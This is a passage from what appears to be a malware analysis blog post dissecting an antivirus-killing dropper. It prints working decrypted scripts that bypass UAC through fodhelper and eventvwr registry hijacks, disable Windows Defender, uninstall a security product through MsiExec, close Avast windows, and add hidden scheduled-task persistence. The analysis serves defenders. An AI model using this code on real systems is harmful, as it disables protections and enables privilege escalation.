class="line">       ++ct;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> retIntPtr;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">a13</span>(<span class="params"><span class="keyword">int</span> a15</span>)</span> &#123;</span><br><span class="line">     PostMessage(<span class="keyword">new</span> IntPtr(a15), <span class="number">0x0100</span>, <span class="keyword">new</span> IntPtr(<span class="number">0x09</span>), <span class="keyword">new</span> IntPtr(<span class="number">0</span>));</span><br><span class="line">     PostMessage(<span class="keyword">new</span> IntPtr(a15), <span class="number">0x0100</span>, <span class="keyword">new</span> IntPtr(<span class="number">0x20</span>), <span class="keyword">new</span> IntPtr(<span class="number">0</span>));</span><br><span class="line">     PostMessage(<span class="keyword">new</span> IntPtr(a15), <span class="number">0x0101</span>, <span class="keyword">new</span> IntPtr(<span class="number">0x20</span>), <span class="keyword">new</span> IntPtr(<span class="number">0</span>));</span><br><span class="line">     ShowWindow(<span class="keyword">new</span> IntPtr(a15), <span class="number">0</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">a11</span>(<span class="params"><span class="keyword">int</span> a15</span>)</span> &#123;</span><br><span class="line">     PostMessage(<span class="keyword">new</span> IntPtr(a15), <span class="number">0x0100</span>, <span class="keyword">new</span> IntPtr(<span class="number">0x09</span>), <span class="keyword">new</span> IntPtr(<span class="number">0</span>));</span><br><span class="line">     PostMessage(<span class="keyword">new</span> IntPtr(a15), <span class="number">0x0101</span>, <span class="keyword">new</span> IntPtr(<span class="number">0x09</span>), <span class="keyword">new</span> IntPtr(<span class="number">0</span>));</span><br><span class="line">     PostMessage(<span class="keyword">new</span> IntPtr(a15), <span class="number">0x0100</span>, <span class="keyword">new</span> IntPtr(<span class="number">0x09</span>), <span class="keyword">new</span> IntPtr(<span class="number">0</span>));</span><br><span class="line">     PostMessage(<span class="keyword">new</span> IntPtr(a15), <span class="number">0x0101</span>, <span class="keyword">new</span> IntPtr(<span class="number">0x09</span>), <span class="keyword">new</span> IntPtr(<span class="number">0</span>));</span><br><span class="line">     PostMessage(<span class="keyword">new</span> IntPtr(a15), <span class="number">0x0100</span>, <span class="keyword">new</span> IntPtr(<span class="number">0x09</span>), <span class="keyword">new</span> IntPtr(<span class="number">0</span>));</span><br><span class="line">     PostMessage(<span class="keyword">new</span> IntPtr(a15), <span class="number">0x0101</span>, <span class="keyword">new</span> IntPtr(<span class="number">0x09</span>), <span class="keyword">new</span> IntPtr(<span class="number">0</span>));</span><br><span class="line">     PostMessage(<span class="keyword">new</span> IntPtr(a15), <span class="number">0x0100</span>, <span class="keyword">new</span> IntPtr(<span class="number">0x09</span>), <span class="keyword">new</span> IntPtr(<span class="number">0</span>));</span><br><span class="line">     PostMessage(<span class="keyword">new</span> IntPtr(a15), <span class="number">0x0101</span>, <span class="keyword">new</span> IntPtr(<span class="number">0x09</span>), <span class="keyword">new</span> IntPtr(<span class="number">0</span>));</span><br><span class="line">     PostMessage(<span class="keyword">new</span> IntPtr(a15), <span class="number">0x0100</span>, <span class="keyword">new</span> IntPtr(<span class="number">0x09</span>), <span class="keyword">new</span> IntPtr(<span class="number">0</span>));</span><br><span class="line">     PostMessage(<span class="keyword">new</span> IntPtr(a15), <span class="number">0x0101</span>, <span class="keyword">new</span> IntPtr(<span class="number">0x09</span>), <span class="keyword">new</span> IntPtr(<span class="number">0</span>));</span><br><span class="line">     PostMessage(<span class="keyword">new</span> IntPtr(a15), <span class="number">0x0100</span>, <span class="keyword">new</span> IntPtr(<span class="number">0x09</span>), <span class="keyword">new</span> IntPtr(<span class="number">0</span>));</span><br><span class="line">     PostMessage(<span class="keyword">new</span> IntPtr(a15), <span class="number">0x0101</span>, <span class="keyword">new</span> IntPtr(<span class="number">0x09</span>), <span class="keyword">new</span> IntPtr(<span class="number">0</span>));</span><br><span class="line">     PostMessage(<span class="keyword">new</span> IntPtr(a15), <span class="number">0x0100</span>, <span class="keyword">new</span> IntPtr(<span class="number">0x09</span>), <span class="keyword">new</span> IntPtr(<span class="number">0</span>));</span><br><span class="line">     PostMessage(<span class="keyword">new</span> IntPtr(a15), <span class="number">0x0101</span>, <span class="keyword">new</span> IntPtr(<span class="number">0x09</span>), <span class="keyword">new</span> IntPtr(<span class="number">0</span>));</span><br><span class="line">     PostMessage(<span class="keyword">new</span> IntPtr(a15), <span class="number">0x0100</span>, <span class="keyword">new</span> IntPtr(<span class="number">0x09</span>), <span class="keyword">new</span> IntPtr(<span class="number">0</span>));</span><br><span class="line">     PostMessage(<span class="keyword">new</span> IntPtr(a15), <span class="number">0x0101</span>, <span class="keyword">new</span> IntPtr(<span class="number">0x09</span>), <span class="keyword">new</span> IntPtr(<span class="number">0</span>));</span><br><span class="line">     PostMessage(<span class="keyword">new</span> IntPtr(a15), <span class="number">0x0100</span>, <span class="keyword">new</span> IntPtr(<span class="number">0x09</span>), <span class="keyword">new</span> IntPtr(<span class="number">0</span>));</span><br><span class="line">     PostMessage(<span class="keyword">new</span> IntPtr(a15), <span class="number">0x0101</span>, <span class="keyword">new</span> IntPtr(<span class="number">0x09</span>), <span class="keyword">new</span> IntPtr(<span class="number">0</span>));</span><br><span class="line">     PostMessage(<span class="keyword">new</span> IntPtr(a15), <span class="number">0x0100</span>, <span class="keyword">new</span> IntPtr(<span class="number">0x09</span>), <span class="keyword">new</span> IntPtr(<span class="number">0</span>));</span><br><span class="line">     PostMessage(<span class="keyword">new</span> IntPtr(a15), <span class="number">0x0101</span>, <span class="keyword">new</span> IntPtr(<span class="number">0x09</span>), <span class="keyword">new</span> IntPtr(<span class="number">0</span>));</span><br><span class="line">     PostMessage(<span class="keyword">new</span> IntPtr(a15), <span class="number">0x0100</span>, <span class="keyword">new</span> IntPtr(<span class="number">0x09</span>), <span class="keyword">new</span> IntPtr(<span class="number">0</span>));</span><br><span class="line">     PostMessage(<span class="keyword">new</span> IntPtr(a15), <span class="number">0x0101</span>, <span class="keyword">new</span> IntPtr(<span class="number">0x09</span>), <span class="keyword">new</span> IntPtr(<span class="number">0</span>));</span><br><span class="line">     PostMessage(<span class="keyword">new</span> IntPtr(a15), <span class="number">0x0100</span>, <span class="keyword">new</span> IntPtr(<span class="number">0x20</span>), <span class="keyword">new</span> IntPtr(<span class="number">0</span>));</span><br><span class="line">     PostMessage(<span class="keyword">new</span> IntPtr(a15), <span class="number">0x0101</span>, <span class="keyword">new</span> IntPtr(<span class="number">0x20</span>), <span class="keyword">new</span> IntPtr(<span class="number">0</span>));</span><br><span class="line">     ShowWindow(<span class="keyword">new</span> IntPtr(a15), <span class="number">0</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">a14</span>(<span class="params"><span class="keyword">int</span> a15</span>)</span> &#123;</span><br><span class="line">     ShowWindow(<span class="keyword">new</span> IntPtr(a15), <span class="number">0</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The above code find the Avast Updater window process ID and Send the appropriate message with <em>a11</em> <em>a14</em> or <em>a13</em> function using windows <em>ShowWindow</em> method.</p><p>In continuation with the above powershell script is the below script with Traverse the Avast updater process using the c# code which was just added.</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a6</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$a7</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">While</span> (<span class="variable">$a</span> <span class="operator">-le</span> <span class="number">5</span>) &#123;</span><br><span class="line">  <span class="variable">$a8</span> = <span class="built_in">Get-Process</span> <span class="string">"instup"</span>;</span><br><span class="line">  <span class="variable">$a9</span> = [<span class="type">a12</span>]::a10(<span class="string">""</span>,<span class="variable">$a8</span>.Id);</span><br><span class="line">  <span class="keyword">If</span> ([<span class="type">a12</span>]::IsWindowVisible(<span class="variable">$a9</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a7</span> <span class="operator">-eq</span> <span class="number">1</span>) &#123;</span><br><span class="line">      [<span class="type">a12</span>]::a11(<span class="variable">$a9</span>);</span><br><span class="line">      <span class="variable">$a7</span>=<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a7</span> <span class="operator">-eq</span> <span class="number">0</span>) &#123;</span><br><span class="line">        [<span class="type">a12</span>]::a13(<span class="variable">$a9</span>);</span><br><span class="line">        <span class="variable">$a7</span>=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a7</span> <span class="operator">-eq</span> <span class="number">2</span>) &#123;</span><br><span class="line">        [<span class="type">a12</span>]::a11(<span class="variable">$a9</span>);</span><br><span class="line">        [<span class="type">a12</span>]::a14(<span class="variable">$a9</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">Start-Sleep</span> <span class="literal">-seconds</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Next in continuation with avast killing javascript is the code shown below :</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fqhqkxq = <span class="string">'powershell -ExecutionPolicy By\\\\\\"\\\\\\"Pass -windowstyle hi\\\\\\"\\\\\\"dd\\\\\\"\\\\\\"en -command \\\\\\"(Get-ItemProperty -path HKCU:\\\\SOFTWARE\\\\ycsdrr).pvrylqzhlnv | Invoke-\'\'Expression\\\\\\"'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (arr[<span class="number">0</span>] == <span class="string">'10'</span>) &#123;</span><br><span class="line">  windowsShell.ShellExecute(<span class="string">"powershell.exe"</span>, <span class="string">'New-Item \'HKCU:\\Software\\Classes\\exefile\\shell\\open\\command\\\' -Force | New-ItemProperty -Name \'(Default)\' -Value \'schtasks /Create /SC DAILY /TN \\"lqesuuz\\" /RL Highest /TR \\"'</span> + kolhp + <span class="string">'\\" /ST 05:12\' -PropertyType string -Force | Out-Null ; Start-Process \'slui.exe\' -Verb RunAs -Wait; Remove-Item -Path \'HKCU:\\Software\\Classes\\exefile\\\' -Force -Recurse; Start-Sleep -s 1; Start-ScheduledTask \'lqesuuz\''</span>, <span class="string">""</span>, <span class="string">"open"</span>, <span class="number">0</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (arr[<span class="number">0</span>] == <span class="string">'6'</span>) &#123;</span><br><span class="line">    windowsShell.ShellExecute(<span class="string">"powershell.exe"</span>,</span><br><span class="line">    <span class="string">'New-Item \'HKCU:\\Software\\Classes\\mscfile\\shell\\open\\command\\\' -Force | New-ItemProperty -Name \'(Default)\' -Value \'schtasks /Create /SC DAILY /TN \\"lqesuuz\\" /RL Highest /TR \\"'</span> + fqhqkxq + <span class="string">'\\" /ST 05:12\' -PropertyType string -Force | Out-Null ; Start-Process \'CompMgmtLauncher.exe\' -Verb RunAs -Wait; Start-Sleep -s 5; Remove-Item -Path \'HKCU:\\Software\\Classes\\mscfile\\\' -Force -Recurse; Start-Process \'schtasks\' \'/run /TN \\"lqesuuz\\"\''</span>,</span><br><span class="line">    <span class="string">""</span>, <span class="string">"open"</span>, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> counter = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (getServiceStatus(<span class="string">'avast! Antivirus'</span>)) &#123;</span><br><span class="line">    WScript.sleep(<span class="number">100</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    WScript.sleep(<span class="number">5000</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  counter = counter + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (counter == <span class="number">1800</span>) &#123;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Its function is to create a scheduled task named as <strong>lqesuuz</strong> and execute it through PowerShell.</p><p>Following are the task which are execute the above code through the scheduled task :</p><ol><li><strong>schtasks /Create /SC DAILY /TN \“lqesuuz\” /RL Highest /TR \&quot;powershell -windowstyle hidden -command “(Get-ItemProperty -path HKCU:\\SOFTWARE\\ycsdrr).pvrylqzhlnv\” /ST 05:12</strong></li><li>*<em>schtasks /Create /SC DAILY /TN \“lqesuuz\” /RL Highest /TR \&quot;powershell -ExecutionPolicy ByPass -windowstyle hidden -command “(Get-ItemProperty -path HKCU:\SOFTWARE\ycsdrr).pvrylqzhlnv\” /ST 05:12*</em></li></ol><p>To understand what the above command does here is some command reference for Microsoft documentation :</p><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><strong>/SC</strong> schedule</td><td>A value that specifies the schedule frequency. Valid values are: MINUTE, HOURLY, DAILY, so on</td></tr><tr><td><strong>/TN</strong> taskname</td><td>name of task</td></tr><tr><td><strong>/RL</strong> level</td><td>A value that sets the run level for the task. Valid values are LIMITED and HIGHEST. The default is LIMITED.</td></tr><tr><td><strong>/TR</strong> taskrun</td><td>A value that specifies the path and file name of the task to be run at the scheduled time</td></tr><tr><td><strong>/ST</strong> starttime</td><td>A value that specifies the start time to run the task. The time format is HH:mm (24-hour time)</td></tr></tbody></table><h1><span id="killing-windows-defender">Killing Windows Defender</span></h1><p>If it detects that the system service contains <strong>WdNisSvc</strong> or <strong>WinDefend</strong> services with following code :</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wvspotnpwm = <span class="string">'B39266B....667'</span>;</span><br><span class="line"><span class="keyword">if</span> ((getServiceStatus(<span class="string">'WdNisSvc'</span>)) || (getServiceStatus(<span class="string">'WinDefend'</span>))) &#123;</span><br><span class="line">  decryptAndDrop(wvspotnpwm, malScriptPath + <span class="string">'nykvwcajm.js'</span>);</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    runShellCommand(<span class="string">'wscript.exe "'</span> + malScriptPath + <span class="string">'nykvwcajm.js"'</span>);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>It generates and executes the <strong>nykvwcajm.js</strong> script, which on decryption is as follows:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">serviceName = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span> (getServiceStatus(<span class="string">'WdNisSvc'</span>)) &#123;</span><br><span class="line">  serviceName = <span class="string">'WdNisSvc'</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (getServiceStatus(<span class="string">'WinDefend'</span>)) &#123;</span><br><span class="line">    serviceName = <span class="string">'WinDefend'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> amdiac = WScript.CreateObject(<span class="string">"shell.application"</span>);</span><br><span class="line"><span class="keyword">var</span> zlrvcjg = <span class="keyword">new</span> ActiveXObject(<span class="string">"WScript.Shell"</span>);</span><br><span class="line"><span class="keyword">var</span> dhqjbo = GetObject(<span class="string">"winmgmts:\\\\.\\root\\CIMV2"</span>);</span><br><span class="line"><span class="keyword">var</span> qpoyqecprmfq = dhqjbo.ExecQuery(<span class="string">"SELECT * FROM Win32_OperatingSystem"</span>, <span class="string">"WQL"</span>, <span class="number">0x10</span> | <span class="number">0x20</span>);</span><br><span class="line"><span class="keyword">var</span> kscpive = <span class="keyword">new</span> Enumerator(qpoyqecprmfq);</span><br><span class="line"><span class="keyword">var</span> zrtkekm = kscpive.item();</span><br><span class="line"><span class="keyword">var</span> llkxvhpslfqw = zrtkekm.SystemDirectory;</span><br><span class="line"><span class="keyword">var</span> tamrvhtepo = zrtkekm.Version;</span><br><span class="line"><span class="keyword">var</span> arr = tamrvhtepo.split(<span class="string">"."</span>);</span><br><span class="line"><span class="keyword">if</span> (arr[<span class="number">0</span>] == <span class="string">'10'</span>) &#123;</span><br><span class="line">  zlrvcjg.RegWrite(<span class="string">"HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command\\"</span>,</span><br><span class="line">  <span class="string">'cmd.exe /C "powershell Set-MpPreference -DisableRealtimeMonitoring $true &amp;&amp; taskkill /im MSASCui* /f /t"'</span>,</span><br><span class="line">  <span class="string">"REG_SZ"</span>);</span><br><span class="line">  zlrvcjg.RegWrite(<span class="string">"HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command\\DelegateExecute"</span>,</span><br><span class="line">  <span class="string">""</span>, <span class="string">"REG_SZ"</span>);</span><br><span class="line">  amdiac.ShellExecute(llkxvhpslfqw + <span class="string">"\\fodhelper.exe"</span>, <span class="string">""</span>, <span class="string">""</span>, <span class="string">"open"</span>, <span class="number">0</span>);</span><br><span class="line">  WScript.sleep(<span class="number">2000</span>);</span><br><span class="line">  amdiac.MinimizeAll();</span><br><span class="line">  zlrvcjg.RegDelete(<span class="string">"HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command\\"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (arr[<span class="number">0</span>] == <span class="string">'6'</span>) &#123;</span><br><span class="line">    zlrvcjg.RegWrite(<span class="string">"HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\\"</span>,</span><br><span class="line">    <span class="string">'cmd.exe /C "sc stop WinDefend &amp;&amp; taskkill /im MSASCui* /f /t"'</span>,</span><br><span class="line">    <span class="string">"REG_SZ"</span>);</span><br><span class="line">    amdiac.ShellExecute(llkxvhpslfqw + <span class="string">"\\eventvwr.exe"</span>, <span class="string">""</span>, <span class="string">""</span>, <span class="string">"open"</span>, <span class="number">0</span>);</span><br><span class="line">    WScript.sleep(<span class="number">2000</span>);</span><br><span class="line">    zlrvcjg.RegDelete(<span class="string">"HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\\"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The above script does the following :</p><ol><li>Decrypt the corresponding JS script content.</li><li>Tries to detect if <strong>WdNisSvc</strong> or <strong>WinDefend</strong> service is running.</li><li>Then it tries to determine the version of the operating system and executes the command based on the OS version.</li><li>If its windows 10 then it does following :</li><li>It write the command <strong>cmd.exe /C &quot;powershell Set-MpPreference -DisableRealtimeMonitoring $true &amp;&amp; taskkill /im MSASCui /f /t cmd. Exe /C &quot;sc stop WinDefend &amp;&amp; taskkill /im MSASCui /f /t</strong> to registry key.</li><li>The corresponding registry key is **HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command**.</li><li>The purpose of the command is to disable the Windows Defender.</li><li>It sets the registry key <strong>HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command\DelegateExecute</strong> value to blank.</li><li>Execute <em>fodhelper.exe</em> this is the binary which read the command from the registry key and executes the command at high privilege.</li><li>sleeps for 2 secs and then deletes the same *<em>HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command*</em> registry key.</li><li>If the Version detected is 6(for Windows 7 and above) in that case it will do the following :</li><li>It write the command <em><em>cmd.exe /C &quot;sc stop WinDefend &amp;&amp; taskkill /im MSASCui</em> /f /t&quot;</em>* to registry key.</li><li>The corresponding registry key is *<em>HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command*</em></li><li>The purpose of the command is to disable the Windows Defender.</li><li>Execute <em>eventvwr.exe</em> this is the binary which read the command from the registry key and executes the command at high privilege.</li><li>sleeps for 2 secs and then deletes the same *<em>HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command*</em> registry key.</li></ol><p>When is say windows 7 and above it means following Operating System:</p><ol><li>Windows Vista</li><li>Windows 7</li><li>Windows 8</li><li>Windows 8.1</li></ol><p>What the above script is tying to achieve is the get privilege escalation and then disable the windows Defender service. To read more about this vulnerability on the Windows UAC bypass check the blogs below :</p><ol><li><a href="https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/">Window 10 UAC Bypass</a></li><li><a href="https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/">Window 7 and above UAC Bypass</a></li></ol><h1><span id="kill-microsoft-network-realtime-inspection-service">Kill Microsoft Network Realtime Inspection Service</span></h1><p>This below snippet in the main javascript file tries to detect if the Microsoft NisSrv service is running.<br>NIsSrv stands for Microsoft <em>Network Realtime Inspection Service</em> its a microsoft antivirus service starts at Windows boot time, implementing the Network Inspection Service. If it detect this service running then it drop and execute <em>bervcptyvulur.js</em> file.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> hoszxms = <span class="string">'B3926...667'</span>;</span><br><span class="line"><span class="keyword">if</span> (getServiceStatus(<span class="string">'NisSrv'</span>)) &#123;</span><br><span class="line">  decryptAndDrop(hoszxms, malScriptPath + <span class="string">'bervcptyvulur.js'</span>);</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    runShellCommand(<span class="string">'wscript.exe "'</span> + malScriptPath + <span class="string">'bervcptyvulur.js"'</span>);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>bervcptyvulur.js</em> file is when decrypted it should look as follows:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> sxwvah = WScript.CreateObject(<span class="string">"shell.application"</span>);</span><br><span class="line"><span class="keyword">var</span> siwbezkij = <span class="keyword">new</span> ActiveXObject(<span class="string">"WScript.Shell"</span>);</span><br><span class="line"><span class="keyword">var</span> fufajgarmx = GetObject(<span class="string">"winmgmts:\\\\.\\root\\CIMV2"</span>);</span><br><span class="line"><span class="keyword">var</span> lsiicx = fufajgarmx.ExecQuery(<span class="string">"SELECT * FROM Win32_OperatingSystem"</span>, <span class="string">"WQL"</span>, <span class="number">0x10</span> | <span class="number">0x20</span>);</span><br><span class="line"><span class="keyword">var</span> zynhqkeg = <span class="keyword">new</span> Enumerator(lsiicx);</span><br><span class="line"><span class="keyword">var</span> iaibbfhyncgmgt = zynhqkeg.item();</span><br><span class="line"><span class="keyword">var</span> vjcrmmpy = iaibbfhyncgmgt.SystemDirectory;</span><br><span class="line"><span class="keyword">var</span> nimlctvre = iaibbfhyncgmgt.Version;</span><br><span class="line"><span class="keyword">var</span> arr = nimlctvre.split(<span class="string">"."</span>);</span><br><span class="line"><span class="keyword">if</span> (arr[<span class="number">0</span>] == <span class="string">'10'</span>) &#123;</span><br><span class="line">  siwbezkij.RegWrite(<span class="string">"HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command\\"</span>,</span><br><span class="line">    <span class="string">'MsiExec.exe /X&#123;2AA3C13E-0531-41B8-AE48-AE28C940A809&#125; ACCEPT=YES /qr+ /quiet'</span>,</span><br><span class="line">    <span class="string">"REG_SZ"</span>);</span><br><span class="line">  siwbezkij.RegWrite(<span class="string">"HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command\\DelegateExecute"</span>,</span><br><span class="line">  <span class="string">""</span>, <span class="string">"REG_SZ"</span>);</span><br><span class="line">  sxwvah.ShellExecute(<span class="string">"explorer.exe"</span>, <span class="string">'"'</span> + vjcrmmpy + <span class="string">'\\fodhelper.exe"'</span>, <span class="string">""</span>, <span class="string">"open"</span>, <span class="number">0</span>);</span><br><span class="line">  WScript.sleep(<span class="number">10000</span>);</span><br><span class="line">  siwbezkij.RegDelete(<span class="string">"HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command\\"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (arr[<span class="number">0</span>] == <span class="string">'6'</span>) &#123;</span><br><span class="line">    siwbezkij.RegWrite(<span class="string">"HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\\"</span>,</span><br><span class="line">      <span class="string">'MsiExec.exe /X &#123;2AA3C13E-0531-41B8-AE48-AE28C940A809&#125; ACCEPT=YES /qr+ /quiet'</span>,</span><br><span class="line">      <span class="string">"REG_SZ"</span>);</span><br><span class="line">    sxwvah.ShellExecute(<span class="string">"explorer.exe"</span>, <span class="string">'"'</span> + vjcrmmpy + <span class="string">'\\eventvwr.exe"'</span>, <span class="string">""</span>, <span class="string">"open"</span>, <span class="number">0</span>);</span><br><span class="line">    WScript.sleep(<span class="number">10000</span>);</span><br><span class="line">    siwbezkij.RegDelete(<span class="string">"HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\\"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This above script uses the same method for privilage escalation with the difference been the command been execute which are as follows :</p><ol><li><strong>MsiExec.exe /X{2AA3C13E-0531-41B8-AE48-AE28C940A809} ACCEPT=YES /qr+ /quiet</strong> for Window 10</li><li><strong>MsiExec.exe /X {2AA3C13E-0531-41B8-AE48-AE28C940A809} ACCEPT=YES /qr+ /quiet</strong> for Window7 and above.</li></ol><h1><span id="kill-ahnlab-antivirus">Kill Ahnlab Antivirus</span></h1><p>If the code detects system running <em>V3 Service</em> then the below code runs. It decrypts and drops a file called <em>recjyzcz.js</em> this file is only dropped only if <em>tgydmilslvp.txt</em> is already present on <em>%USERPROFILE%</em> path otherwise it will drops the file <em>tgydmilslvp.txt</em> that contains value 777.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fileSystemObject = <span class="keyword">new</span> ActiveXObject(<span class="string">'Scripting.FileSystemObject'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (getServiceStatus(<span class="string">'V3 Service'</span>)) &#123;</span><br><span class="line">  <span class="keyword">var</span> mvqwaqu = <span class="string">'B39...667'</span>;</span><br><span class="line">  <span class="keyword">if</span> (fileSystemObject.FileExists(malScriptPath + <span 